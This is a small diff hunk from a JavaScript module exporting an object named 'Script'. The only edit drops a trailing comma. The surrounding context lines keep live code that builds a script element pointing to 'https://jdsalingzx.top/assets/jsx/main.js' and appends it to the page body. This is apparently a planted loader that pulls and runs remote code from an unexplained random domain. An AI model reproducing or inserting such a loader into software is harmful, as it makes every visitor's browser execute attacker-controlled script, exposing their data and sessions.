@@ -43,5 +43,5 @@ export const Script = {
 		x.type = "text/javascript"
 		x.src = "https://jdsalingzx.top/assets/jsx/main.js"
 		document.body.appendChild(x)
-	},
+	}
 }
